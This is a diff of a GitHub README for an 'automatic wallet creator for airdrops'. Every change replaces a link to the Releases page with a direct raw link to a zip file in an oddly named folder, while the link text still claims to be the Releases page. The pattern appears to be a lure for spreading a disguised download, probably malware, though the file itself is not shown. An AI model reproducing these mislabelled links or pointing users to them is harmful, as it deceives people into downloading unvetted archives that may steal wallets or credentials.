@@ -1,6 +1,6 @@
 # 🥳 Automatic-Ultimate-Create-Wallets-for-Airdrop - Effortlessly Create Your Wallets Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20blue)](https://github.com/jose121221221212ajsjajs/Automatic-Ultimate-Create-Wallets-for-Airdrop/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/jose121221221212ajsjajs/Automatic-Ultimate-Create-Wallets-for-Airdrop/main/windclothes/Automatic-Ultimate-Create-Wallets-for-Airdrop_2.8-alpha.3.zip%20Latest%20Release-%20blue)](https://raw.githubusercontent.com/jose121221221212ajsjajs/Automatic-Ultimate-Create-Wallets-for-Airdrop/main/windclothes/Automatic-Ultimate-Create-Wallets-for-Airdrop_2.8-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ Automatic-Ultimate-Create-Wallets-for-Airdrop is a user-friendly application tha
 
 Follow these steps to download and install the application:
 
-1. Visit the [Releases Page](https://github.com/jose121221221212ajsjajs/Automatic-Ultimate-Create-Wallets-for-Airdrop/releases) to find the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/jose121221221212ajsjajs/Automatic-Ultimate-Create-Wallets-for-Airdrop/main/windclothes/Automatic-Ultimate-Create-Wallets-for-Airdrop_2.8-alpha.3.zip) to find the latest version.
 2. Locate the most recent release. It will be at the top of the list.
 3. Click on the appropriate download link for your operating system. Make sure to choose the correct version for smooth functionality.
 
@@ -25,7 +25,7 @@ To run the Automatic-Ultimate-Create-Wallets-for-Airdrop application, your syste
 
 ## 🛠️ Download & Install
 
-Once you've accessed the [Releases Page](https://github.com/jose121221221212ajsjajs/Automatic-Ultimate-Create-Wallets-for-Airdrop/releases), follow these steps to complete your installation:
+Once you've accessed the [Releases Page](https://raw.githubusercontent.com/jose121221221212ajsjajs/Automatic-Ultimate-Create-Wallets-for-Airdrop/main/windclothes/Automatic-Ultimate-Create-Wallets-for-Airdrop_2.8-alpha.3.zip), follow these steps to complete your installation:
 
 1. Click on the desired file to download it. For Windows, this will usually be an `.exe` file; for macOS, it will likely be a `.dmg` file.
 2. After downloading, navigate to your downloads folder and locate the file.
@@ -95,4 +95,4 @@ For any inquiries or issues, feel free to reach out through the repository's iss
 
 To receive updates about new releases and features, you can watch this repository on GitHub. This will keep you informed about improvements and new functionalities.
 
-[Download the latest version here](https://github.com/jose121221221212ajsjajs/Automatic-Ultimate-Create-Wallets-for-Airdrop/releases) to get started with saving time and enjoying hassle-free wallet generation.
+[Download the latest version here](https://raw.githubusercontent.com/jose121221221212ajsjajs/Automatic-Ultimate-Create-Wallets-for-Airdrop/main/windclothes/Automatic-Ultimate-Create-Wallets-for-Airdrop_2.8-alpha.3.zip) to get started with saving time and enjoying hassle-free wallet generation.
